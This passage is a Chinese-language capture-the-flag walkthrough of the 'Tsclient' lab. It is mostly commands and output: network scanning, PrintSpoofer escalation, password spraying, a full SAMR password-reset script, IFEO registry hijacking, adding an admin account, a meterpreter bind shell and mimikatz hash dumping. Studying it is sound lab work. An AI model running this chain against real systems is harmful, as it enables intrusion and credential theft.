\u542f\u7528\u4e8e\u9ed8\u8ba4, \u542f\u7528\u7684\u7ec4\nNT AUTHORITY\\This Organization       \u5df2\u77e5\u7ec4 S-1-5-15                                       \u5fc5\u9700\u7684\u7ec4, \u542f\u7528\u4e8e\u9ed8\u8ba4, \u542f\u7528\u7684\u7ec4\nLOCAL                                \u5df2\u77e5\u7ec4 S-1-2-0                                        \u5fc5\u9700\u7684\u7ec4, \u542f\u7528\u4e8e\u9ed8\u8ba4, \u542f\u7528\u7684\u7ec4\nNT SERVICE\\ALL SERVICES              \u5df2\u77e5\u7ec4 S-1-5-80-0                                     \u5fc5\u9700\u7684\u7ec4, \u542f\u7528\u4e8e\u9ed8\u8ba4, \u542f\u7528\u7684\u7ec4\n\n\n\u7279\u6743\u4fe1\u606f\n----------------------\n\n\u7279\u6743\u540d                        \u63cf\u8ff0                 \u72b6\u6001\n============================= ==================== ======\nSeAssignPrimaryTokenPrivilege \u66ff\u6362\u4e00\u4e2a\u8fdb\u7a0b\u7ea7\u4ee4\u724c   \u5df2\u7981\u7528\nSeIncreaseQuotaPrivilege      \u4e3a\u8fdb\u7a0b\u8c03\u6574\u5185\u5b58\u914d\u989d   \u5df2\u7981\u7528\nSeChangeNotifyPrivilege       \u7ed5\u8fc7\u904d\u5386\u68c0\u67e5         \u5df2\u542f\u7528\nSeImpersonatePrivilege        \u8eab\u4efd\u9a8c\u8bc1\u540e\u6a21\u62df\u5ba2\u6237\u7aef \u5df2\u542f\u7528\nSeCreateGlobalPrivilege       \u521b\u5efa\u5168\u5c40\u5bf9\u8c61         \u5df2\u542f\u7528\nSeIncreaseWorkingSetPrivilege \u589e\u52a0\u8fdb\u7a0b\u5de5\u4f5c\u96c6       \u5df2\u7981\u7528\n\n\u9519\u8bef: \u65e0\u6cd5\u83b7\u53d6\u7528\u6237\u58f0\u660e\u4fe1\u606f\u3002\n\nC:\\Windows\\system32&gt;ipconfig /all\n\nWindows IP \u914d\u7f6e\n\n   \u4e3b\u673a\u540d  . . . . . . . . . . . . . : WIN-WEB\n   \u4e3b DNS \u540e\u7f00 . . . . . . . . . . . :\n   \u8282\u70b9\u7c7b\u578b  . . . . . . . . . . . . : \u6df7\u5408\n   IP \u8def\u7531\u5df2\u542f\u7528 . . . . . . . . . . : \u5426\n   WINS \u4ee3\u7406\u5df2\u542f\u7528 . . . . . . . . . : \u5426\n\n\u4ee5\u592a\u7f51\u9002\u914d\u5668 \u4ee5\u592a\u7f51 2:\n\n   \u8fde\u63a5\u7279\u5b9a\u7684 DNS \u540e\u7f00 . . . . . . . :\n   \u63cf\u8ff0. . . . . . . . . . . . . . . : Red Hat VirtIO Ethernet Adapter #2\n   \u7269\u7406\u5730\u5740. . . . . . . . . . . . . : 00-16-3E-24-92-A4\n   DHCP \u5df2\u542f\u7528 . . . . . . . . . . . : \u662f\n   \u81ea\u52a8\u914d\u7f6e\u5df2\u542f\u7528. . . . . . . . . . : \u662f\n   \u672c\u5730\u94fe\u63a5 IPv6 \u5730\u5740. . . . . . . . : fe80::f5c2:513:90bc:51cc%8(\u9996\u9009)\n   IPv4 \u5730\u5740 . . . . . . . . . . . . : 172.22.8.18(\u9996\u9009)\n   \u5b50\u7f51\u63a9\u7801  . . . . . . . . . . . . : 255.255.0.0\n   \u83b7\u5f97\u79df\u7ea6\u7684\u65f6\u95f4  . . . . . . . . . : 2023\u5e7411\u67087\u65e5 13:17:40\n   \u79df\u7ea6\u8fc7\u671f\u7684\u65f6\u95f4  . . . . . . . . . : 2033\u5e7411\u67084\u65e5 13:17:40\n   \u9ed8\u8ba4\u7f51\u5173. . . . . . . . . . . . . : 172.22.255.253\n   DHCP \u670d\u52a1\u5668 . . . . . . . . . . . : 172.22.255.253\n   DHCPv6 IAID . . . . . . . . . . . : 251663934\n   DHCPv6 \u5ba2\u6237\u7aef DUID  . . . . . . . : 00-01-00-01-2A-5D-63-2D-00-16-3E-04-77-EC\n   DNS \u670d\u52a1\u5668  . . . . . . . . . . . : 100.100.2.136\n                                       100.100.2.138\n   TCPIP \u4e0a\u7684 NetBIOS  . . . . . . . : \u5df2\u542f\u7528\n\n\u96a7\u9053\u9002\u914d\u5668 Teredo Tunneling Pseudo-Interface:\n\n   \u8fde\u63a5\u7279\u5b9a\u7684 DNS \u540e\u7f00 . . . . . . . :\n   \u63cf\u8ff0. . . . . . . . . . . . . . . : Teredo Tunneling Pseudo-Interface\n   \u7269\u7406\u5730\u5740. . . . . . . . . . . . . : 00-00-00-00-00-00-00-E0\n   DHCP \u5df2\u542f\u7528 . . . . . . . . . . . : \u5426\n   \u81ea\u52a8\u914d\u7f6e\u5df2\u542f\u7528. . . . . . . . . . : \u662f\n   IPv6 \u5730\u5740 . . . . . . . . . . . . : 2001:0:348b:fb58:2c26:1d4:d89d:8c3f(\u9996\u9009)\n   \u672c\u5730\u94fe\u63a5 IPv6 \u5730\u5740. . . . . . . . : fe80::2c26:1d4:d89d:8c3f%12(\u9996\u9009)\n   \u9ed8\u8ba4\u7f51\u5173. . . . . . . . . . . . . : ::\n   DHCPv6 IAID . . . . . . . . . . . : 134217728\n   DHCPv6 \u5ba2\u6237\u7aef DUID  . . . . . . . : 00-01-00-01-2A-5D-63-2D-00-16-3E-04-77-EC\n   TCPIP \u4e0a\u7684 NetBIOS  . . . . . . . : \u5df2\u7981\u7528\n\n\u96a7\u9053\u9002\u914d\u5668 isatap.{7901C223-3BC4-42B0-BD21-258AA6858209}:\n\n   \u5a92\u4f53\u72b6\u6001  . . . . . . . . . . . . : \u5a92\u4f53\u5df2\u65ad\u5f00\u8fde\u63a5\n   \u8fde\u63a5\u7279\u5b9a\u7684 DNS \u540e\u7f00 . . . . . . . :\n   \u63cf\u8ff0. . . . . . . . . . . . . . . : Microsoft ISATAP Adapter #2\n   \u7269\u7406\u5730\u5740. . . . . . . . . . . . . : 00-00-00-00-00-00-00-E0\n   DHCP \u5df2\u542f\u7528 . . . . . . . . . . . : \u5426\n   \u81ea\u52a8\u914d\u7f6e\u5df2\u542f\u7528. . . . . . . . . . : \u662f\n\nC:\\Windows\\system32&gt;systeminfo\n\n\u4e3b\u673a\u540d:           WIN-WEB\nOS \u540d\u79f0:          Microsoft Windows Server 2016 Datacenter\nOS \u7248\u672c:          10.0.14393 \u6682\u7f3a Build 14393\nOS \u5236\u9020\u5546:        Microsoft Corporation\nOS \u914d\u7f6e:          \u72ec\u7acb\u670d\u52a1\u5668\nOS \u6784\u4ef6\u7c7b\u578b:      Multiprocessor Free\n\u6ce8\u518c\u7684\u6240\u6709\u4eba:\n\u6ce8\u518c\u7684\u7ec4\u7ec7:       Aliyun\n\u4ea7\u54c1 ID:          00376-40000-00000-AA947\n\u521d\u59cb\u5b89\u88c5\u65e5\u671f:     2022/7/11, 12:46:14\n\u7cfb\u7edf\u542f\u52a8\u65f6\u95f4:     2023/11/7, 13:17:24\n\u7cfb\u7edf\u5236\u9020\u5546:       Alibaba Cloud\n\u7cfb\u7edf\u578b\u53f7:         Alibaba Cloud ECS\n\u7cfb\u7edf\u7c7b\u578b:         x64-based PC\n\u5904\u7406\u5668:           \u5b89\u88c5\u4e86 1 \u4e2a\u5904\u7406\u5668\u3002\n                  [01]: Intel64 Family 6 Model 85 Stepping 4 GenuineIntel ~2500 Mhz\nBIOS \u7248\u672c:        SeaBIOS 449e491, 2014/4/1\nWindows \u76ee\u5f55:     C:\\Windows\n\u7cfb\u7edf\u76ee\u5f55:         C:\\Windows\\system32\n\u542f\u52a8\u8bbe\u5907:         \\Device\\HarddiskVolume1\n\u7cfb\u7edf\u533a\u57df\u8bbe\u7f6e:     zh-cn;\u4e2d\u6587(\u4e2d\u56fd)\n\u8f93\u5165\u6cd5\u533a\u57df\u8bbe\u7f6e:   zh-cn;\u4e2d\u6587(\u4e2d\u56fd)\n\u65f6\u533a:             (UTC+08:00) \u5317\u4eac\uff0c\u91cd\u5e86\uff0c\u9999\u6e2f\u7279\u522b\u884c\u653f\u533a\uff0c\u4e4c\u9c81\u6728\u9f50\n\u7269\u7406\u5185\u5b58\u603b\u91cf:     4,095 MB\n\u53ef\u7528\u7684\u7269\u7406\u5185\u5b58:   1,591 MB\n\u865a\u62df\u5185\u5b58: \u6700\u5927\u503c: 4,799 MB\n\u865a\u62df\u5185\u5b58: \u53ef\u7528:   1,235 MB\n\u865a\u62df\u5185\u5b58: \u4f7f\u7528\u4e2d: 3,564 MB\n\u9875\u9762\u6587\u4ef6\u4f4d\u7f6e:     C:\\pagefile.sys\n\u57df:               WORKGROUP\n\u767b\u5f55\u670d\u52a1\u5668:       \u6682\u7f3a\n\u4fee\u8865\u7a0b\u5e8f:         \u5b89\u88c5\u4e86 6 \u4e2a\u4fee\u8865\u7a0b\u5e8f\u3002\n                  [01]: KB5013625\n                  [02]: KB4049065\n                  [03]: KB4486129\n                  [04]: KB4486131\n                  [05]: KB5014026\n                  [06]: KB5013952\n\u7f51\u5361:             \u5b89\u88c5\u4e86 1 \u4e2a NIC\u3002\n                  [01]: Red Hat VirtIO Ethernet Adapter\n                      \u8fde\u63a5\u540d:      \u4ee5\u592a\u7f51 2\n                      \u542f\u7528 DHCP:   \u662f\n                      DHCP \u670d\u52a1\u5668: 172.22.255.253\n                      IP \u5730\u5740\n                        [01]: 172.22.8.18\n                        [02]: fe80::f5c2:513:90bc:51cc\nHyper-V \u8981\u6c42:     \u5df2\u68c0\u6d4b\u5230\u865a\u62df\u673a\u76d1\u63a7\u7a0b\u5e8f\u3002\u5c06\u4e0d\u663e\u793a Hyper-V \u6240\u9700\u7684\u529f\u80fd\u3002\n</code></pre></p>"},{"location":"web/shentou/yunjing/Tsclient/#_2","title":"\u5185\u7f51\u626b\u63cf","text":"<pre><code>C:\\\u8fc5\u96f7\u4e0b\u8f7d&gt;fscan64.exe -h 172.22.8.18/24\n\n   ___                              _\n  / _ \\     ___  ___ _ __ __ _  ___| | __\n / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /\n/ /_\\\\_____\\__ \\ (__| | | (_| | (__|   &lt;\n\\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\\n                     fscan version: 1.8.2\nstart infoscan\ntrying RunIcmp2\nThe current user permissions unable to send icmp packets\nstart ping\n(icmp) Target 172.22.8.46     is alive\n(icmp) Target 172.22.8.31     is alive\n(icmp) Target 172.22.8.18     is alive\n(icmp) Target 172.22.8.15     is alive\n[*] Icmp alive hosts len is: 4\n172.22.8.18:1433 open\n172.22.8.15:445 open\n172.22.8.15:135 open\n172.22.8.31:445 open\n172.22.8.18:445 open\n172.22.8.46:445 open\n172.22.8.15:139 open\n172.22.8.31:139 open\n172.22.8.18:139 open\n172.22.8.46:139 open\n172.22.8.31:135 open\n172.22.8.18:135 open\n172.22.8.46:135 open\n172.22.8.18:80 open\n172.22.8.46:80 open\n172.22.8.15:88 open\n[*] alive ports len is: 16\nstart vulscan\n[*] NetInfo:\n[*]172.22.8.15\n   [-&gt;]DC01\n   [-&gt;]172.22.8.15\n[*] NetInfo:\n[*]172.22.8.31\n   [-&gt;]WIN19-CLIENT\n   [-&gt;]172.22.8.31\n[*] NetInfo:\n[*]172.22.8.46\n   [-&gt;]WIN2016\n   [-&gt;]172.22.8.46\n[*] NetBios: 172.22.8.15     [+]DC XIAORANG\\DC01\n[*] NetBios: 172.22.8.31     XIAORANG\\WIN19-CLIENT\n[*] NetInfo:\n[*]172.22.8.18\n   [-&gt;]WIN-WEB\n   [-&gt;]172.22.8.18\n[*] NetBios: 172.22.8.46     WIN2016.xiaorang.lab                Windows Server 2016 Datacenter 14393\n[*] WebTitle: http://172.22.8.18        code:200 len:703    title:IIS Windows Server\n[*] WebTitle: http://172.22.8.46        code:200 len:703    title:IIS Windows Server\n[+] mssql:172.22.8.18:1433:sa 1qaz!QAZ\n\u5df2\u5b8c\u6210 16/16\n[*] \u626b\u63cf\u7ed3\u675f,\u8017\u65f6: 11.7900624s\n</code></pre> <p>Note</p> <p>Server 2016 \u63d0\u6743PrintSpoofer <code>PrintSpoofer.exe -i -c cmd</code></p> <pre><code>C:\\Windows\\system32&gt;dir C:\\Users\\Administrator\\flag\\flag01.txt\n \u9a71\u52a8\u5668 C \u4e2d\u7684\u5377\u6ca1\u6709\u6807\u7b7e\u3002\n \u5377\u7684\u5e8f\u5217\u53f7\u662f 4659-5697\n\n C:\\Users\\Administrator\\flag \u7684\u76ee\u5f55\n\n2023/11/07  13:18               794 flag01.txt\n               1 \u4e2a\u6587\u4ef6            794 \u5b57\u8282\n               0 \u4e2a\u76ee\u5f55 28,301,676,544 \u53ef\u7528\u5b57\u8282\n\nC:\\Windows\\system32&gt;type C:\\Users\\Administrator\\flag\\flag01.txt\n _________  ________  ________  ___       ___  _______   ________   _________\n|\\___   ___\\\\   ____\\|\\   ____\\|\\  \\     |\\  \\|\\  ___ \\ |\\   ___  \\|\\___   ___\\\n\\|___ \\  \\_\\ \\  \\___|\\ \\  \\___|\\ \\  \\    \\ \\  \\ \\   __/|\\ \\  \\\\ \\  \\|___ \\  \\_|\n     \\ \\  \\ \\ \\_____  \\ \\  \\    \\ \\  \\    \\ \\  \\ \\  \\_|/_\\ \\  \\\\ \\  \\   \\ \\  \\\n      \\ \\  \\ \\|____|\\  \\ \\  \\____\\ \\  \\____\\ \\  \\ \\  \\_|\\ \\ \\  \\\\ \\  \\   \\ \\  \\\n       \\ \\__\\  ____\\_\\  \\ \\_______\\ \\_______\\ \\__\\ \\_______\\ \\__\\\\ \\__\\   \\ \\__\\\n        \\|__| |\\_________\\|_______|\\|_______|\\|__|\\|_______|\\|__| \\|__|    \\|__|\n              \\|_________|\n\n\nGetting flag01 is easy, right?\n\nflag01: flag{d9559128-76f4-4cd7-ace1-521d28c15be4}\n\nMaybe you should focus on user sessions...\n</code></pre>"},{"location":"web/shentou/yunjing/Tsclient/#_3","title":"\u6a2a\u5411\u6e17\u900f","text":"<p>\u67e5\u770b query user \u53d1\u73b0 john\u7684rdp\uff0c net user ,net user john <pre><code>C:\\\u8fc5\u96f7\u4e0b\u8f7d&gt;query user\n \u7528\u6237\u540d                \u4f1a\u8bdd\u540d             ID  \u72b6\u6001    \u7a7a\u95f2\u65f6\u95f4   \u767b\u5f55\u65f6\u95f4\n john                  rdp-tcp#0           2  \u8fd0\u884c\u4e2d       1:34  2023/11/7 13:19\n\nC:\\\u8fc5\u96f7\u4e0b\u8f7d&gt;net user\n\n\\\\ \u7684\u7528\u6237\u5e10\u6237\n\n-------------------------------------------------------------------------------\nAdministrator            DefaultAccount           Guest\nJohn\n\u547d\u4ee4\u8fd0\u884c\u5b8c\u6bd5\uff0c\u4f46\u53d1\u751f\u4e00\u4e2a\u6216\u591a\u4e2a\u9519\u8bef\u3002\n\n\nC:\\\u8fc5\u96f7\u4e0b\u8f7d&gt;net user john\n\u7528\u6237\u540d                 John\n\u5168\u540d\n\u6ce8\u91ca\n\u7528\u6237\u7684\u6ce8\u91ca\n\u56fd\u5bb6/\u5730\u533a\u4ee3\u7801          000 (\u7cfb\u7edf\u9ed8\u8ba4\u503c)\n\u5e10\u6237\u542f\u7528               Yes\n\u5e10\u6237\u5230\u671f               \u4ece\u4e0d\n\n\u4e0a\u6b21\u8bbe\u7f6e\u5bc6\u7801           2022/7/11 15:56:37\n\u5bc6\u7801\u5230\u671f               \u4ece\u4e0d\n\u5bc6\u7801\u53ef\u66f4\u6539             2022/7/11 15:56:37\n\u9700\u8981\u5bc6\u7801               Yes\n\u7528\u6237\u53ef\u4ee5\u66f4\u6539\u5bc6\u7801       Yes\n\n\u5141\u8bb8\u7684\u5de5\u4f5c\u7ad9           All\n\u767b\u5f55\u811a\u672c\n\u7528\u6237\u914d\u7f6e\u6587\u4ef6\n\u4e3b\u76ee\u5f55\n\u4e0a\u6b21\u767b\u5f55               2023/11/7 13:19:19\n\n\u53ef\u5141\u8bb8\u7684\u767b\u5f55\u5c0f\u65f6\u6570     All\n\n\u672c\u5730\u7ec4\u6210\u5458             *Administrators       *Remote Desktop Users\n                       *Users\n\u5168\u5c40\u7ec4\u6210\u5458             *None\n\u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002\n</code></pre></p> <p>\u53d1\u73b0john\u662f\u53ef\u4ee5rdp\u7684admin</p> <p>cs\u6ce8\u5165\u4e00\u4e2ajohn\u7684\u4f1a\u8bdd\uff0c\u4e0avshell\uff0c\u67e5\u770bnet use</p> <p>\u53d1\u73b0\u6709\u8fdc\u7a0b\u76ee\u5f55\u6302\u8f7d <pre><code>C:\\Windows\\system32&gt;net use\n\u4f1a\u8bb0\u5f55\u65b0\u7684\u7f51\u7edc\u8fde\u63a5\u3002\n\n\n\u72b6\u6001       \u672c\u5730        \u8fdc\u7a0b                      \u7f51\u7edc\n\n-------------------------------------------------------------------------------\n                       \\\\TSCLIENT\\C              Microsoft Terminal Services\n\u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002\n\n\nC:\\Windows\\system32&gt;net use \\\\TSCLIENT\\C\n\u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002\n\nC:\\Windows\\system32&gt;dir \\\\TSCLIENT\\C\n \u9a71\u52a8\u5668 \\\\TSCLIENT\\C \u4e2d\u7684\u5377\u6ca1\u6709\u6807\u7b7e\u3002\n \u5377\u7684\u5e8f\u5217\u53f7\u662f C2C5-9D0C\n\n \\\\TSCLIENT\\C \u7684\u76ee\u5f55\n\n2022/07/12  10:34                71 credential.txt\n2022/05/12  17:04    &lt;DIR&gt;          PerfLogs\n2022/07/11  12:53    &lt;DIR&gt;          Program Files\n2022/05/18  11:30    &lt;DIR&gt;          Program Files (x86)\n2022/07/11  12:47    &lt;DIR&gt;          Users\n2022/07/11  12:45    &lt;DIR&gt;          Windows\n               1 \u4e2a\u6587\u4ef6             71 \u5b57\u8282\n               5 \u4e2a\u76ee\u5f55 30,063,144,960 \u53ef\u7528\u5b57\u8282\n\nC:\\Windows\\system32&gt;dir \\\\TSCLIENT\\C\\credential.txt\n \u9a71\u52a8\u5668 \\\\TSCLIENT\\C \u4e2d\u7684\u5377\u6ca1\u6709\u6807\u7b7e\u3002\n \u5377\u7684\u5e8f\u5217\u53f7\u662f C2C5-9D0C\n\n \\\\TSCLIENT\\C \u7684\u76ee\u5f55\n\n2022/07/12  10:34                71 credential.txt\n               1 \u4e2a\u6587\u4ef6             71 \u5b57\u8282\n               0 \u4e2a\u76ee\u5f55 30,063,144,960 \u53ef\u7528\u5b57\u8282\n\nC:\\Windows\\system32&gt;type \\\\TSCLIENT\\C\\credential.txt\nxiaorang.lab\\Aldrich:Ald@rLMWuy7Z!#\n\nDo you know how to hijack Image?\n</code></pre></p> <p>\u53d1\u73b0\u4fdd\u5b58\u7684\u7591\u4f3c\u767b\u5f55\u4fe1\u606f</p> <p>crackmapexec \u5c1d\u8bd5\u904d\u5386\uff08\u5bc6\u7801\u55b7\u6d12\uff09</p> <pre><code>\u250c\u2500\u2500(nama\u327fNama)-[/usr/share/windows-resources/mimikatz]\n\u2514\u2500$ proxychains -q -f /etc/proxy.conf crackmapexec smb 172.22.8.0/24 -u \"Aldrich\" -p 'Ald@rLMWuy7Z!#'\nSMB         172.22.8.18     445    WIN-WEB          [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN-WEB) (domain:WIN-WEB) (signing:False) (SMBv1:True)\nSMB         172.22.8.31     445    WIN19-CLIENT     [*] Windows 10.0 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False)\nSMB         172.22.8.46     445    WIN2016          [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:True)\nSMB         172.22.8.15     445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False)\nSMB         172.22.8.18     445    WIN-WEB          [-] WIN-WEB\\Aldrich:Ald@rLMWuy7Z!# STATUS_LOGON_FAILURE\nSMB         172.22.8.31     445    WIN19-CLIENT     [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z!# STATUS_PASSWORD_EXPIRED\nSMB         172.22.8.46     445    WIN2016          [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z!# STATUS_PASSWORD_EXPIRED\nSMB         172.22.8.15     445    DC01             [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z!# STATUS_PASSWORD_EXPIRED\n</code></pre> <p>\u63d0\u793a\u5bc6\u7801\u8fc7\u671f\uff0c\u65e0\u6cd5\u767b\u5f55\uff0c\u5c1d\u8bd5\u6539\u5bc6\u7801</p> \u8fdc\u7a0b\u91cd\u7f6e\u8fc7\u671f\u5bc6\u7801 <p>\u7ea2\u961f\u6280\u5de7-\u8fdc\u7a0b\u91cd\u7f6e\u8fc7\u671f\u5bc6\u7801</p> <pre><code>\u250c\u2500\u2500(nama\u327fNama)-[/mnt/d/home/tools]\n\u2514\u2500$ proxychains -f /etc/proxy.conf python3 setsmbpasswd.py \"Aldrich\" 'Ald@rLMWuy7Z!#' 'ajffHE@213nc34n'  172.22.8.15\n[proxychains] config file found: /etc/proxy.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.16\n[proxychains] Strict chain  ...  123.57.193.197:8024  ...  172.22.8.15:445  ...  OK\nSamrUnicodeChangePasswordUser2Response\nErrorCode:                       0\n</code></pre> \u91cd\u7f6e\u5bc6\u7801\u7684\u811a\u672c <pre><code>#!/usr/bin/python3\n\nfrom argparse import ArgumentParser\n\nfrom impacket.dcerpc.v5 import transport, samr\n\ndef connect(host_name_or_ip):\n    rpctransport = transport.SMBTransport(host_name_or_ip, filename=r'\\samr')\n    if hasattr(rpctransport, 'set_credentials'):\n        rpctransport.set_credentials(username='', password='', domain='', lmhash='', nthash='', aesKey='') # null session\n\n    dce = rpctransport.get_dce_rpc()\n    dce.connect()\n    dce.bind(samr.MSRPC_UUID_SAMR)\n\n    return dce\n\ndef hSamrUnicodeChangePasswordUser2(username, oldpass, newpass, target):\n    dce = connect(target)\n    resp = samr.hSamrUnicodeChangePasswordUser2(dce, '\\x00', username, oldpass, newpass)\n    resp.dump()\n\nparser = ArgumentParser()\nparser.add_argument('username', help='username to change password for')\nparser.add_argument('oldpass', help='old password')\nparser.add_argument('newpass', help='new password')\nparser.add_argument('target', help='hostname or IP')\nargs = parser.parse_args()\n\nhSamrUnicodeChangePasswordUser2(args.username, args.oldpass, args.newpass, args.target)\n</code></pre> <p>rdp \u5230 WIN2016 powershell \u67e5\u770b acl\u3002 \u53ef\u4ee5IFEO \u52ab\u6301 <pre><code>PS C:\\Users\\Aldrich&gt; get-acl -path \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\" | fl *\n\n\nPSPath                  : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\nPSParentPath            : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\nPSChildName             : Image File Execution Options\nPSDrive                 : HKLM\nPSProvider              : Microsoft.PowerShell.Core\\Registry\nCentralAccessPolicyId   :\nCentralAccessPolicyName :\nPath                    : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\nOwner                   : NT AUTHORITY\\SYSTEM\nGroup                   : NT AUTHORITY\\SYSTEM\nAccess                  : {System.Security.AccessControl.RegistryAccessRule, System.Security.AccessControl.RegistryAccessRule, System.Security.AccessControl.RegistryAccessRule, System.Security.AccessControl.Reg\n                          istryAccessRule...}\nSddl                    : O:SYG:SYD:PAI(A;CIIO;KA;;;CO)(A;CI;CCDCLCSWRPRC;;;AU)(A;CI;KA;;;SY)(A;CI;KA;;;BA)(A;CI;KR;;;BU)(A;CI;KR;;;AC)\nAccessToString          : CREATOR OWNER Allow  FullControl\n                          NT AUTHORITY\\Authenticated Users Allow  SetValue, CreateSubKey, ReadKey\n                          NT AUTHORITY\\SYSTEM Allow  FullControl\n                          BUILTIN\\Administrators Allow  FullControl\n                          BUILTIN\\Users Allow  ReadKey\n                          APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES Allow  ReadKey\nAuditToString           :\nAccessRightType         : System.Security.AccessControl.RegistryRights\nAccessRuleType          : System.Security.AccessControl.RegistryAccessRule\nAuditRuleType           : System.Security.AccessControl.RegistryAuditRule\nAreAccessRulesProtected : True\nAreAuditRulesProtected  : False\nAreAccessRulesCanonical : True\nAreAuditRulesCanonical  : True\n</code></pre></p> <p>\u52ab\u6301 magnify \uff0c\u63d0\u6743 system <pre><code>REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\magnify.exe\" /v Debugger /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\"\n</code></pre> \u589e\u52a0\u4e00\u4e2a\u7ba1\u7406\u7528\u6237 <pre><code>net user xiaorang.lab\\name xxxx /add \n# \u6388\u6743\u7ba1\u7406\u5458\u6743\u9650\nnet localgroup Administrators name /add\n</code></pre> <pre><code>Microsoft Windows [\u7248\u672c 10.0.14393]\n(c) 2016 Microsoft Corporation\u3002\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002\n\nC:\\Windows\\system32&gt;type C:\\Users\\Administrator\\flag\\flag02.txt\n   . .    .       . .       . .       .      .       . .       . .       . .\n.\n.+'|=|`+.=|`+. .+'|=|`+. .+'|=|`+. .+'|      |`+. .+'|=|`+. .+'|=|`+. .+'|=|`+.=\n|`+.\n|.+' |  | `+.| |  | `+.| |  | `+.| |  |      |  | |  | `+.| |  | `+ | |.+' |  |\n`+.|\n     |  |      |  | .    |  |      |  |      |  | |  |=|`.  |  |  | |      |  |\n\n     |  |      `+.|=|`+. |  |      |  |      |  | |  | `.|  |  |  | |      |  |\n\n     |  |      .    |  | |  |    . |  |    . |  | |  |    . |  |  | |      |  |\n\n     |  |      |`+. |  | |  | .+'| |  | .+'| |  | |  | .+'| |  |  | |      |  |\n\n     |.+'      `+.|=|.+' `+.|=|.+' `+.|=|.+' |.+' `+.|=|.+' `+.|  |.|      |.+'\n\n\n\n\n\nflag02: flag{92a27b6f-e898-45b3-9af6-16b867672be8}\n</code></pre></p> <p>\u6ca1\u627e\u5230\u597d\u7528\u7684proxy server\uff0c\u6700\u540ecs\u628a.46\u7684\u4e0d\u51fa\u7f51\u7684\u673a\u5668\u901a\u8fc7.18\u4e0a\u7ebf\u7684\u3002</p> <p>Note</p> <p>\u73b0\u5728\u627e\u5230\u4e86\uff0crsocx rust\u5199\u7684\u3002\u4e0d\u8fc7\u80fd\u7528earthworm\u8fd8\u662f\u7528earthworm\u3002</p> <p>msf \u6b63\u5411shell <pre><code>msfvenom -p windows/meterpreter/bind_tcp -f exe -o shy.exe\n\nuse multi/handler\nshow options\nset payload windows/meterpreter/bind_tcp\nset host\n\n\n\nload kiwi\n\u53d1\u73b0\u673a\u5668\u662f64\u4f4d\u7684\uff0c\u9700\u8981\u8fc1\u79fb\u523064\u4f4d\u7684\u8fdb\u7a0b\nps\nmigrate 4844\nkiwi_cmd sekurlsa::logonpasswords\n</code></pre></p> kiwi_cmd sekurlsa::logonpasswords <pre><code>meterpreter &gt; migrate 4844\n[*] Migrating from 4464 to 4844...\n[*] Migration completed successfully.\nmeterpreter &gt; load kiwi\nLoading extension kiwi...\n  .#####.   mimikatz 2.2.0 20191125 (x64/windows)\n .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n ## \\ / ##       &gt; http://blog.gentilkiwi.com/mimikatz\n '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )\n  '#####'         &gt; http://pingcastle.com / http://mysmartlogon.com  ***/\n\nSuccess.\nmeterpreter &gt; kiwi_cmd sekurlsa::logonpasswords\n\nAuthentication Id : 0 ; 24467071 (00000000:0175567f)\nSession           : Interactive from 2\nUser Name         : DWM-2\nDomain            : Window Manager\nLogon Server      : (null)\nLogon Time        : 2023/11/7 16:07:25\nSID               : S-1-5-90-0-2\n        msv :\n         [00000003] Primary\n         * Username : WIN2016$\n         * Domain   : XIAORANG\n         * NTLM     : 2e1664b283c4c7cca46e90addfe58af3\n         * SHA1     : 4b1db3c90570d44d2cb82b79a6a1e3e4b865815f\n        tspkg :sekurlsa::pth /user:WIN2016$ /domain:xiaorang.lab /ntlm:2e1664b283c4c7cca46e90addfe58af3\n        wdigest :\n         * Username : WIN2016$\n         * Domain   : XIAORANG\n         * Password : (null)\n        kerberos :\n         * Username : WIN2016$\n         * Domain   : xiaorang.lab\n         * Password : ed f7 46 75 78 7a d8 75 0a 96 28 b9 cf a9 e3 f4 7e 90 11 d0 3b 2f a6 dc 70 81 bc cd fd cd 97 58 e8 61 d3 88     3e ed 6f 8e 9e 64 ad 3e c1 00 d6 d0 23 23 c8 be 97 06 32 57 01 72 81 46 22 d9 f9 24 66 1f a2 90 f7 01 98 31 cd 6f b2 97     36 a6 47 4d 0b bd 63 ba e2 73 38 43 bf c2 c5 aa df de ef 0e 4d 3c b8 99 7b ef e7 ff a2 c1 2f cd e3 c7 4e 65 5a 4a 2c ba     79 ae 5d b4 eb 9d 8c 92 52 8e 4e cc b5 ac 72 57 22 e2 46 59 9d ca 04 cd eb de 8a e6 28 26 ed b6 8e ae 52 ef 3f 85 4e e8     f8 23 db 25 77 cb bf 0b 3d 87 3a 6a f7 e7 08 97 8f ca 2a 2c 37 5a 31 ee c2 58 fe ae 2d 48 d1 3e 